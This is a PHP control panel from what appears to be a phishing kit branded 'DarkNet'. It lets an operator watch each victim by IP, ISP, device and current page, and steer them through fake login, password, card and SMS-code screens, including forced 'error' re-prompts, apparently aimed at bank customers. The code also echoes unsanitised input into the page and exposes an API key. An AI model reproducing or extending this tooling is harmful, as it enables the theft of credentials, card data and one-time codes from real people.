<?php
    // =============================
    include "./Assets/php/config/config.php";   
    $ip_infos = file_get_contents("https://pro.ip-api.com/php/". $_GET['ip'] ."?key=UO8wl6MQD2zPxmf&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query");
    $ip_infos = unserialize($ip_infos);
    // =============================
    $cu = file_get_contents("http://country.io/phone.json");
    $cu = json_decode($cu, true);
    // =============================
    $device_and_browser = file_get_contents("./data/user.json");
    $info_device_and_browser = json_decode($device_and_browser,true);

    
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <link href="https://cdn.jsdelivr.net/npm/flowbite@3.1.2/dist/flowbite.min.css" rel="stylesheet" />
        <link rel="icon" type="image/x-icon" href="./Asstes/imgs/logo2.jpg" />

        <title>Control</title>
        <style>
            body{
                background:#000000;
                overflow-x: hidden;
            }
            .wrapper{
                width:100%;
            }
            button[type="submit"] , button[type="button"]{
                font-size:13px;
                font-weight:600;
            }
            .header{
                gap:15px;
            }
            .wrapper img{
                width:100%;
                height:100%;
                object-fit: cover;
                position: absolute;
                opacity:0.02;
                z-index: -1;
                cursor: pointer;
            }
            .ipx{
                animation: bubble 1.0s infinite;
                color:red;
                font-size:14px;
            }
            .box{
                width:100%;
                border:1px solid white;
                display: flex;
                padding:15px;
                position: relative;
            }
            .box_img{
                width:70px;
                height: auto;
                position: absolute;
                right:15px;
                opacity:0.5;
            }
            .box h1{
                font-size:18px;
                color:white;
            }
            .box p{
                font-size:17px;
                font-weight:600;
                color:white;
            }
            @keyframes bubble {
                0%   { transform:scale(0.5); opacity:0.0; }
                50%  { transform:scale(1.2); opacity:0.5; }
                100% { transform:scale(1.0); opacity:1.0; }
            }
            form{
                display: grid;
                margin-top:20px;
                grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr;
                gap: 13px;
            }
            .full_row{
                grid-column: 1 / 9;
            }
        </style>
    </head>

    <body>
        <div class="header container d-flex  align-items-center pt-3 justify-content-between" style="background-color: black;">
            <div class="box">
                <div class="txt">
                    <h1>Total Visitors</h1>
                    <p><?php echo getVisitorsCount(); ?></p>
                </div>
                <img src="./Assets/imgs/vis_panel.png" class="box_img" alt="">
            </div>
            <div style="border:none;" class="logo box d-flex justify-content-center flex-column align-items-center text-center">
                <img src="./Assets/imgs/logo2.jpg" alt="" style="width:50px; border-radius:50%;">
                <p class="mb-0" style='color:white;'><?php echo base64_decode("RGFya05ldA=="); ?></p>
            </div>
            <div class="box">
                <div class="txt">
                    <h1>Current page</h1>
                    <p id="page" style="color: #00f000;font-size: 15px;"></p>
                </div>
                <img src="./Assets/imgs/browser.png" class="box_img" alt="">                
            </div>
        </div>


        <div class="relative container overflow-x-auto mt-3">
            <table class="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
                <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                    <tr>
                        <th scope="col" class="px-3 py-3">
                            <i class="ri-map-pin-fill" style="font-size:17px;"></i> IP Address
                        </th>
                        <th scope="col" class="px-3 py-3">
                            <i class="ri-global-fill" style="font-size:17px;"></i> country
                        </th>
                        <th scope="col" class="px-3 py-3">
                            <i class="ri-router-line" style="font-size:17px;"></i> ISP
                        </th>
                        <th scope="col" class="px-3 py-3">
                            <i class="ri-cpu-line" style="font-size:17px;"></i> Device
                        </th>
                        <th scope="col" class="px-3 py-3">
                            <i class="ri-base-station-fill" style="font-size:17px;"></i> Ping
                        </th>
                    </tr>
                </thead>
                <tbody>
                    <tr class=" border-b dark:bg-gray-800 dark:border-gray-700 border-gray-200">
                        <th scope="row" class="px-3 py-4 font-medium text-gray-900 whitespace-nowrap text-white">
                            <?php echo $_GET["ip"]; ?>
                        </th>
                        <td scope="row" class="px-3 py-4 font-medium text-gray-900 whitespace-nowrap text-white">
                            <img style="width:23px" class="d-inline" src="<?php echo "https://assets.revolut.com/assets/flags/".$ip_infos["countryCode"]."@2x.webp" ?>">
                            <p class="mb-0 d-inline"><?php echo $ip_infos["country"] ?></p>
                        </td>
                        <td scope="row" class="px-3 py-4 font-medium text-gray-900 whitespace-nowrap text-white">
                            <p class="mb-0"><?php echo $ip_infos["isp"] ?></p>
                        </td>
                        <td scope="row" class="px-3 py-4 font-medium text-gray-900 whitespace-nowrap text-white">
                            <?php echo $info_device_and_browser[$_GET['ip']]['device']; ?> / <i class="ri-<?php echo strtolower($info_device_and_browser[$_GET['ip']]['browser']); ?>-fill"></i>
                        </td>
                        <td scope="row" class="px-3 py-4 font-medium text-gray-900 whitespace-nowrap text-white">
                            <p class="mb" id="visitor-list"></p>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <div class="container">
            <form method="post" action="./Assets/php/config/control.php">
                <input type="hidden" name="step" value="control">
                <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                <button type="submit" class="btn btn-primary full_row" name="to" value="app">APP</button>
                <button type="submit" class="btn btn-success" name="to" value="log">LOGIN</button>
                <button type="submit" class="btn btn-danger" name="to" value="log_error">LOGIN</button>
                    <button type="submit" class="btn btn-success" name="to" value="pass">PASSWORD</button>
                    <button type="submit" class="btn btn-danger" name="to" value="pass_error">PASSWORD</button>                   
                <button type="submit" class="btn btn-success" name="to" value="card">CARD</button> 
                <button type="submit" class="btn btn-danger" name="to" value="card_error">CARD</button> 
                <button type="submit" class="btn btn-success" name="to" value="sms">SMS</button> 
                <button type="submit" class="btn btn-danger" name="to" value="sms_error">SMS</button>  
                <button type="submit" class="btn btn-success full_row" name="to" value="success"><i class="ri-checkbox-circle-fill" style="font-weight:normal;"></i> SUCCESS</button>
            </form>  
            <div class="ip mt-3">
                <?php
                if (isset($_GET["ip"])) {
                    echo "<p class='text-center ipx'>".$_GET["ip"]."</p>";
                }
                ?>
            </div>                      
        </div>       
        <footer class="text-center container pt-3" style="border-top:1px solid #eeeeee5c;">
            <p style="color:white; font-size:14px;"><?php echo base64_decode("QCAyMDI1"); ?> <a href="https://t.me/DarkNet_v1" style="color:red;"><?php echo base64_decode("QERhcmtOZXQ="); ?></a> <?php echo base64_decode("QWxsIFJpZ2h0cyBSZXNlcnZhZA=="); ?></p>
        </footer>
        

        <!-- JS FILES -->
        <script src="https://cdn.jsdelivr.net/npm/flowbite@3.1.2/dist/flowbite.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>

            function fetchVisitors() {
                const targetIp = '<?php echo $_GET["ip"] ?>';

                fetch('./status/get_visitors.php')
                    .then(response => response.json())
                    .then(data => {
                        const container = document.getElementById('visitor-list');
                        const pageEl = document.getElementById('page');
                        container.innerHTML = '';

                        // this ip not has data 
                        const info = data[targetIp];
                        if (!info) {
                            container.textContent = `⛔ This IP has no data. (${targetIp})`;
                            pageEl.textContent = '';
                            return;
                        }

                        const now = Math.floor(Date.now() / 1000);
                        const isOnline = (now - info.last_update) < 60 && info.status === 'online';

                        // show status
                        const div = document.createElement('div');
                        div.className = isOnline ? 'online' : 'offline';
                        div.textContent = `${isOnline ? '🟢 Online' : '🔴 Offline'}`;
                        container.appendChild(div);

                        // show current data
                        pageEl.textContent = info.current_page || 'unknown';
                    })
                    .catch(() => {
                        document.getElementById('visitor-list').textContent = 'Error fetching data';
                    });
            }

            fetchVisitors();
            setInterval(fetchVisitors, 5000);


        </script>
    </body>

</html>